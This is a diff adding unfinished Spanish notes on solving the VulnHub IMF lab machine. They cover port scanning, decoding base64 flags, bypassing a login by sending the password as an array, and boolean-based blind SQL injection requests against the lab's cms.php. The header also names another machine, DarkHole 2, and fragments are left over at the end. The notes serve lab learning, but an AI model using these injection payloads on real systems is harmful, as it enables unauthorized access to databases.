@@ -1,0 +1,261 @@
+Plataforma: [VulnHub](https://www.vulnhub.com/entry/imf-1,162/)
+Ataques: 
+- Web Application Attack
+- SQL inyection.
+- Remote SSH.
+Dificultad: Media
+
+Herramientas:
+- [[VW Ware]].
+
+**Plataforma:** [VulnHub](https://www.vulnhub.com/entry/darkhole-2,740/) 
+**Objetivo:** _Rootear_ la máquina virtual DarkHole V2.
+**Dificultad:** Media 
+**Técnicas Clave:** Enumeración GIT, Inyección SQL, Escalada de Privilegios (Abuso de Servicio Local).
+
+---
+
+
+# Fase de reconocimiento: 
+
+Usando la herramienta arp-scan para definir cual es la IP de la maquina
+
+❯ arp-scan -I vmnet1 --localnet
+Interface: vmnet1, type: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 172.16.23.1
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+172.16.23.129	00:0c:29:73:6c:8b	VMware, Inc.
+172.16.23.254	00:50:56:ff:74:5a	VMware, Inc.
+
+2 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 2.076 seconds (123.31 hosts/sec). 2 responded
+
+Descubrimos que la maquina es 172.16.23.129
+
+Intentamos hacer ping: 
+
+❯ ping -c 1 172.16.23.129
+
+Maquina no responde por lo que nos apoyamos de la herramienta TCPing para rerificar conexiones
+https://github.com/cloverstd/tcping
+
+[
+QUE HACE TCPING?
+]
+
+Me logre conectar por medio de la herramienta, tuve que copilarla a mano:
+
+git clone https://github.com/cloverstd/tcping
+cd tcping
+╰─ go build -ldflags "-s -w" .
+
+Go tuvo que descargar unas cosas, por lo que tuve que tirar de proxy para realizar la conexión de forma correcta       
+
+## nmap
+
+Hago un primer escaneo básico de reconocimiento de puertos:
+
+╰─ sudo nmap -p- --open -sS -T4 -vvv -n -Pn 172.16.23.129 -oG allports  
+
+Me da la siguiente info:
+   4   │ Host: 172.16.23.129 ()  Ports: 80/open/tcp//http/// Ignored State: filtered (65534)
+
+Con esto me doy cuenta que solo el puerto 80 está abierto
+
+
+Con los puertos definidos tiro el siguiente comando:
+
+❯ nmap -p80 -sCV 172.16.23.129 -oN targeted
+
+   5   │ PORT   STATE SERVICE VERSION
+   6   │ 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+   7   │ |_http-title: IMF - Homepage
+   8   │ |_http-server-header: Apache/2.4.18 (Ubuntu)
+
+
+
+vamos a la soruce de la web page y encontramos unas cadena en lo que parece ser base64
+
+
+ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==
+
+```
+ejecutamos ❯ echo "ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==" | base64 -d; echo
+```
+
+teniendo como resultado:
+
+```
+flag2{aW1mYWRtaW5pc3RyYXRvcg==}
+```
+
+resultado:
+imfadministrator
+
+obviamente la ruta en el servidor web :v
+
+buscando en los subdominios de la pagina tambien encontramos
+
+```
+<!-- flag1{YWxsdGhlZmlsZXM=} -->
+```
+dando como resultado: allthefiles (Que?)
+
+Tambien encontramos unos posibles usuarios 
+![[Pasted image 20251017142006.png]]
+
+
+
+--- 
+Ingreso a  /imfadministrator
+
+source code: 
+```
+|   |
+|---|
+|<form method="POST" action="">|
+|<label>Username:</label><input type="text" name="user" value=""><br />|
+|<label>Password:</label><input type="password" name="pass" value=""><br />|
+|<input type="submit" value="Login">|
+|<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->|
+|</form>|
+||
+```
+
+nos encontramos lo que parece ser un mensaje de contraseña "harcoded" XD
+
+
+
+
+---
+
+
+Genial, con esta informacion procedo a verificar que se pueden enumerar usuarios en el panel de login. 
+
+de esta forma, me doy cuenta que todos los usuarios existen en la base de datos
+
+con esta informacion procedo a interceptar la petición con burp suit para modificar las solicitudes.
+
+![[Pasted image 20251017143648.png]]
+
+mi amigo 'or 1=1-- - no di resultado ni nada por estilo. Lo que funcionó es interceptar el campo de pass, dando a entender que es un array, dando como respuesta TRUE y consiguiendo la 3ra flag:
+
+```
+flag3{Y29udGludWVUT2Ntcw==}<br />
+```
+continueTOcms
+
++-
+
+
+
+en el CMS hacemos unoos ataques SQL
+
+probamos una comilla en la URL y nos fijamos que tiene un error SQL dandonos el directorio de server
+
+GET /imfadministrator/cms.php?pagename=home' HTTP/1.1
+
+Me doy cuenta que el error indica que está trabajando con reconocimiento booleano 
+de bases de datos, por lo que procedemos a revisar esta misma logica:
+
+
+
+GET /imfadministrator/cms.php?pagename=home'+and +'1'='1
+
+Vemos "Welcome to the IMF Administration." en la pantalla por lo que de esta forma podemos identificar cuando algo se considera TRUE
+
+GET /imfadministrator/cms.php?pagename=home'+and +'1'='2
+
+De esta forma, la pantalla sale completamente blanca. Ya sabemos que significa FALSE
+
+
+
+Ya con este en mente, podemos empezar a extraer información de la base de datos!
+
+Con esta teria confirmamos el nombre de la base "mysql" dentro de SQL.
+
+
+GET /imfadministrator/cms.php?pagename=home'+and+(select+schema_name+from+information_schema.schemata+limit+0,1)='mysql HTTP/1.1
+
+claro, ahora sabemos que la base de datos tiene nombres comunes como "mysql" o "information_schema". Ahora vamos a averigurar los nombres de las bases de datos restantes. para ello, debebos probar caracter por caracter hasta rerificar de forma correcta. esto se puede automatizar con python de una forma to guapa- apra verifificar letra por letra hago.
+
+Teniendo en cuenta que la letra "m" de la palabra mysql es la primera cargo el siguiente payload:
+
+GET /imfadministrator/cms.php?pagename=home'+and+(select+substring(schema_name,1,1)+from+information_schema.schemata+limit+2,1)='m 
+
+devolviendome TRUE!
+
+esto confirma que podemos enuerar los caracteres de las bases de datos aunque no nos cozcamos las misas.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+```
+
+|<script src="[js/vendor/modernizr-2.6.2.min.js](http://172.16.23.129/js/vendor/modernizr-2.6.2.min.js)"></script>|
+|<script src="[js/vendor/jquery-1.10.2.min.js](http://172.16.23.129/js/vendor/jquery-1.10.2.min.js)"></script>|
+|<script src="[js/bootstrap.min.js](http://172.16.23.129/js/bootstrap.min.js)"></script>|
+|<script src="[js/ZmxhZzJ7YVcxbVl.js](http://172.16.23.129/js/ZmxhZzJ7YVcxbVl.js)"></script>|
+|<script src="[js/XUnRhVzVwYzNS.js](http://172.16.23.129/js/XUnRhVzVwYzNS.js)"></script>|
+|<script src="[js/eVlYUnZjZz09fQ==.min.js](http://172.16.23.129/js/eVlYUnZjZz09fQ==.min.js)"></script>|
+```
+Escaneo basico de reconocimiento
+```
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-14 22:36 -0500
+Initiating ARP Ping Scan at 22:36
+Scanning 172.16.23.129 [1 port]
+Completed ARP Ping Scan at 22:36, 0.07s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 22:36
+Scanning 172.16.23.129 [65535 ports]
+Discovered open port 80/tcp on 172.16.23.129
+SYN Stealth Scan Timing: About 23.23% done; ETC: 22:39 (0:01:42 remaining)
+SYN Stealth Scan Timing: About 59.61% done; ETC: 22:38 (0:00:41 remaining)
+Completed SYN Stealth Scan at 22:38, 87.52s elapsed (65535 total ports)
+Nmap scan report for 172.16.23.129
+Host is up, received arp-response (0.00027s latency).
+Scanned at 2025-10-14 22:36:49 -05 for 88s
+Not shown: 65534 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+
+80/tcp open  http    syn-ack ttl 64
+MAC Address: 00:0C:29:73:6C:8B (VMware)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 87.73 seconds
+           Raw packets sent: 131138 (5.770MB) | Rcvd: 104 (5.320KB)
+
+```
+
+sudo nmap -p- --open -sS -T4 -vvv -n -Pn 172.16.23.129
+
+sudo nmap -p80 -sCV 172.16.23.129
+
+
+172.16.23.129	00:0c:29:73:6c:8b	VMware, Inc.
+
+ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==
+
+DESCARGAR;
+- tcping GITHUB
